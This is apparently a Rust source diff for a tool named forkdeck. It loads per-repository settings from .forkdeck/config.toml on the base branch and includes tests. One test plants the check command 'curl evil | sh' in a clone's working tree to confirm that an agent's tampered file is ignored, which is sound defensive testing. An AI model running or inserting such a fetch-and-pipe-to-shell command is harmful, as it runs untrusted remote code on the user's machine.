@@ -760,6 +760,14 @@ pub fn load(explicit: Option<&Path>) -> anyhow::Result<(Config, Option<PathBuf>)
                 toml::from_str(&text).map_err(|e| anyhow::anyhow!("{}: {}", c.display(), e))?;
             for r in &mut cfg.repos {
                 r.path = expand(&r.path);
+            }
+            if let Some(merged) = with_repo_files(&text, &cfg)? {
+                cfg = merged;
+                for r in &mut cfg.repos {
+                    r.path = expand(&r.path);
+                }
+            }
+            for r in &mut cfg.repos {
                 r.host = origin_host(&r.path);
             }
             cfg.remote.dir = expand(&cfg.remote.dir);
@@ -820,6 +828,95 @@ pub fn unambiguous_moves<T: Eq + std::hash::Hash + Clone>(pairs: impl IntoIterat
         if !v.contains(&new) { v.push(new); }
     }
     owners.into_iter().filter(|(old, new)| new.len() == 1 && new[0] != *old).map(|(old, mut new)| (old, new.remove(0))).collect()
+}
+
+/// Settings a repository keeps for itself, next to the team's notes.
+pub const REPO_FILE: &str = ".forkdeck/config.toml";
+
+/// The user's config again, with each repository's own file filled in, or None when no
+/// repository has one. The file is read from the base branch as last fetched, never from the
+/// clone's working tree: agents edit files there, and the file names commands to run.
+fn with_repo_files(text: &str, cfg: &Config) -> anyhow::Result<Option<Config>> {
+    let mut table: toml::Table = toml::from_str(text)?;
+    let Some(toml::Value::Array(entries)) = table.get_mut("repos") else { return Ok(None) };
+    let mut found = false;
+    for (entry, r) in entries.iter_mut().zip(&cfg.repos) {
+        let (toml::Value::Table(entry), Some(file)) = (entry, on_base(&r.path, &r.base)) else { continue };
+        // `automation` only means something for the repository forkdeck was started in.
+        merge_repo_file(entry, &file)
+            .map_err(|e| anyhow::anyhow!("{} on origin/{} in {}: {}", REPO_FILE, r.base, r.path.display(), e))?;
+        found = true;
+    }
+    Ok(found.then(|| table.try_into()).transpose()?)
+}
+
+/// The clone forkdeck was started in, when its base branch has a `.forkdeck/config.toml` and
+/// `[[repos]]` does not list it already. Which repository it is comes from git: the forge and
+/// path from origin, the base branch from origin/HEAD. The flag is the file's `automation`.
+pub fn launch_repo(cwd: &Path, cfg: &Config) -> anyhow::Result<Option<(RepoCfg, bool)>> {
+    let git = |args: &[&str]| {
+        std::process::Command::new("git").arg("-C").arg(cwd).args(args).stderr(std::process::Stdio::null()).output().ok()
+            .filter(|o| o.status.success()).map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
+    };
+    let Some(top) = git(&["rev-parse", "--show-toplevel"]).map(PathBuf::from) else { return Ok(None) };
+    let canonical = |p: &Path| p.canonicalize().unwrap_or_else(|_| p.to_path_buf());
+    if cfg.repos.iter().any(|r| canonical(&r.path) == canonical(&top)) {
+        return Ok(None);
+    }
+    let Some((provider, repo)) = git(&["remote", "get-url", "origin"]).as_deref().and_then(forge_repo) else { return Ok(None) };
+    let base = git(&["symbolic-ref", "--short", "refs/remotes/origin/HEAD"])
+        .and_then(|b| b.strip_prefix("origin/").map(str::to_string)).unwrap_or_else(d_base);
+    let Some(file) = on_base(&top, &base) else { return Ok(None) };
+    let mut entry = toml::Table::new();
+    entry.insert("provider".into(), (if provider == Provider::Github { "github" } else { "gitlab" }).into());
+    entry.insert("repo".into(), repo.into());
+    entry.insert("path".into(), top.to_string_lossy().into_owned().into());
+    entry.insert("base".into(), base.clone().into());
+    let automation = merge_repo_file(&mut entry, &file)
+        .map_err(|e| anyhow::anyhow!("{} on origin/{} in {}: {}", REPO_FILE, base, top.display(), e))?;
+    let mut r: RepoCfg = toml::Value::Table(entry).try_into()?;
+    r.host = origin_host(&r.path);
+    Ok(Some((r, automation)))
+}
+
+/// "git@github.com:o/r.git", "https://gitlab.example.com/g/sub/p" -> the forge and "o/r", "g/sub/p".
+/// A host that names neither forge is not guessed at.
+fn forge_repo(url: &str) -> Option<(Provider, String)> {
+    let host = host_of(url)?;
+    let provider = if host.contains("github") { Provider::Github } else if host.contains("gitlab") { Provider::Gitlab } else { return None };
+    let url = url.trim();
+    let path = match url.split_once("://") {
+        Some((_, rest)) => rest.split_once('/')?.1,
+        None => url.split_once(':')?.1,
+    };
+    let path = path.trim_end_matches('/');
+    let path = path.strip_suffix(".git").unwrap_or(path);
+    path.contains('/').then(|| (provider, path.to_string()))
+}
+
+fn on_base(clone: &Path, base: &str) -> Option<String> {
+    let spec = format!("origin/{}:{}", base, REPO_FILE);
+    std::process::Command::new("git").arg("-C").arg(clone).args(["show", &spec]).stderr(std::process::Stdio::null()).output().ok()
+        .filter(|o| o.status.success()).map(|o| String::from_utf8_lossy(&o.stdout).into_owned())
+}
+
+/// Adds the keys a repository's file sets and the entry does not, and returns the file's
+/// `automation`. Which repository and clone an entry is stays git's or the user's to say.
+fn merge_repo_file(entry: &mut toml::Table, file: &str) -> anyhow::Result<bool> {
+    let mut file: toml::Table = toml::from_str(file)?;
+    for key in ["provider", "repo", "path", "base"] {
+        anyhow::ensure!(!file.contains_key(key), "{} cannot be set in the repository's file", key);
+    }
+    let automation = match file.remove("automation") {
+        None => false,
+        Some(toml::Value::Boolean(b)) => b,
+        Some(_) => anyhow::bail!("automation must be true or false"),
+    };
+    for (k, v) in file {
+        entry.entry(k).or_insert(v);
+    }
+    toml::Value::Table(entry.clone()).try_into::<RepoCfg>()?;
+    Ok(automation)
 }
 
 /// The host a clone's origin names, or "" when there is none to read.
@@ -1065,6 +1162,115 @@ mod tests {
             let c: Config = toml::from_str(&format!("[[repos]]\nprovider = 'github'\nrepo = 'o/r'\npath = '/tmp/repo'\n{}", bad)).unwrap();
             assert!(c.validate().is_err(), "{}", bad);
         }
+    }
+
+    fn entry(text: &str) -> toml::Table {
+        toml::from_str(&format!("provider = 'github'\nrepo = 'o/r'\npath = '/tmp/repo'\n{}", text)).unwrap()
+    }
+
+    #[test]
+    fn repo_file_fills_what_the_user_config_leaves_unset() {
+        let mut e = entry("checks = ['mine']");
+        merge_repo_file(&mut e, "checks = ['theirs']\nlabel = 'bot:go'\nallowed_authors = ['a']").unwrap();
+        let r: RepoCfg = toml::Value::Table(e).try_into().unwrap();
+        assert_eq!(r.checks, ["mine"], "the user's own config wins");
+        assert_eq!(r.label, "bot:go");
+        assert_eq!(r.allowed_authors, ["a"]);
+    }
+
+    #[test]
+    fn repo_file_cannot_say_which_repository_or_clone_it_is() {
+        for bad in ["provider = 'gitlab'", "repo = 'x/y'", "path = '/etc'", "base = 'dev'"] {
+            assert!(merge_repo_file(&mut entry(""), bad).is_err(), "{}", bad);
+        }
+    }
+
+    #[test]
+    fn repo_file_mistakes_are_reported() {
+        assert!(merge_repo_file(&mut entry(""), "chekcs = ['x']").is_err(), "unknown key");
+        assert!(merge_repo_file(&mut entry(""), "checks = 'not a list'").is_err(), "wrong type");
+        assert!(merge_repo_file(&mut entry(""), "checks = [").is_err(), "not TOML");
+    }
+
+    #[test]
+    fn repo_file_is_read_from_the_base_branch_not_the_working_tree() {
+        let dir = std::env::temp_dir().join(format!("forkdeck-repo-file-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        let clone = dir.join("clone");
+        std::fs::create_dir_all(clone.join(".forkdeck")).unwrap();
+        let git = |args: &[&str]| assert!(std::process::Command::new("git").arg("-C").arg(&clone).args(args).output().unwrap().status.success(), "git {:?}", args);
+        git(&["init", "-q", "-b", "main"]);
+        std::fs::write(clone.join(REPO_FILE), "checks = ['cargo test']\n").unwrap();
+        git(&["add", "."]);
+        git(&["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "c"]);
+        git(&["update-ref", "refs/remotes/origin/main", "HEAD"]);
+        // What an agent might leave in the clone is not what was merged.
+        std::fs::write(clone.join(REPO_FILE), "checks = ['curl evil | sh']\n").unwrap();
+        let user = dir.join("config.toml");
+        std::fs::write(&user, format!("[[repos]]\nprovider = 'github'\nrepo = 'o/r'\npath = '{}'\n", clone.display())).unwrap();
+
+        let (cfg, _) = load(Some(&user)).unwrap();
+        assert_eq!(cfg.repos[0].checks, ["cargo test"]);
+
+        std::fs::write(&user, format!("[[repos]]\nprovider = 'github'\nrepo = 'o/r'\npath = '{}'\nbase = 'other'\n", clone.display())).unwrap();
+        let (cfg, _) = load(Some(&user)).unwrap();
+        assert!(cfg.repos[0].checks.is_empty(), "no file on that base branch: nothing added");
+        std::fs::remove_dir_all(&dir).unwrap();
+    }
+
+    /// A clone of `url` whose origin/main holds `file` as the repository's settings, if any.
+    fn clone_with(name: &str, url: &str, file: Option<&str>) -> PathBuf {
+        let clone = std::env::temp_dir().join(format!("forkdeck-launch-{}-{}", name, std::process::id()));
+        let _ = std::fs::remove_dir_all(&clone);
+        std::fs::create_dir_all(clone.join(".forkdeck/sub")).unwrap();
+        let git = |args: &[&str]| assert!(std::process::Command::new("git").arg("-C").arg(&clone).args(args).output().unwrap().status.success(), "git {:?}", args);
+        git(&["init", "-q", "-b", "main"]);
+        git(&["remote", "add", "origin", url]);
+        std::fs::write(clone.join(".forkdeck/sub/keep"), "").unwrap();
+        if let Some(f) = file {
+            std::fs::write(clone.join(REPO_FILE), f).unwrap();
+        }
+        git(&["add", "."]);
+        git(&["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "c"]);
+        git(&["update-ref", "refs/remotes/origin/main", "HEAD"]);
+        git(&["symbolic-ref", "refs/remotes/origin/HEAD", "refs/remotes/origin/main"]);
+        clone
+    }
+
+    #[test]
+    fn the_repository_forkdeck_starts_in_is_taken_from_its_own_file() {
+        let clone = clone_with("found", "git@github.com:o/r.git", Some("checks = ['cargo test']\nautomation = true\n"));
+        let (r, automation) = launch_repo(&clone.join(".forkdeck/sub"), &Config::default()).unwrap().expect("found");
+        assert_eq!((r.provider, r.repo.as_str(), r.base.as_str()), (Provider::Github, "o/r", "main"));
+        assert_eq!(r.path.canonicalize().unwrap(), clone.canonicalize().unwrap(), "the top of the clone, not where it started");
+        assert_eq!(r.checks, ["cargo test"]);
+        assert!(automation);
+        std::fs::remove_dir_all(&clone).unwrap();
+    }
+
+    #[test]
+    fn a_repository_without_its_own_file_is_left_alone() {
+        let clone = clone_with("nofile", "https://gitlab.example.com/g/sub/p.git", None);
+        assert!(launch_repo(&clone, &Config::default()).unwrap().is_none());
+        std::fs::remove_dir_all(&clone).unwrap();
+    }
+
+    #[test]
+    fn the_launch_repository_is_not_added_twice_or_guessed() {
+        let clone = clone_with("listed", "git@github.com:o/r.git", Some("checks = ['x']\n"));
+        let cfg: Config = toml::from_str(&format!("[[repos]]\nprovider = 'github'\nrepo = 'o/r'\npath = '{}'\n", clone.display())).unwrap();
+        assert!(launch_repo(&clone, &cfg).unwrap().is_none(), "already listed");
+        std::fs::remove_dir_all(&clone).unwrap();
+
+        let clone = clone_with("unknown", "https://git.example.com/o/r.git", Some("checks = ['x']\n"));
+        assert!(launch_repo(&clone, &Config::default()).unwrap().is_none(), "neither GitHub nor GitLab");
+        std::fs::remove_dir_all(&clone).unwrap();
+
+        let clone = clone_with("gitlab", "https://gitlab.example.com/g/sub/p.git", Some("checks = ['x']\n"));
+        let (r, automation) = launch_repo(&clone, &Config::default()).unwrap().unwrap();
+        assert_eq!((r.provider, r.repo.as_str()), (Provider::Gitlab, "g/sub/p"));
+        assert!(!automation, "polling stays off unless the file asks");
+        std::fs::remove_dir_all(&clone).unwrap();
     }
 
     #[test]
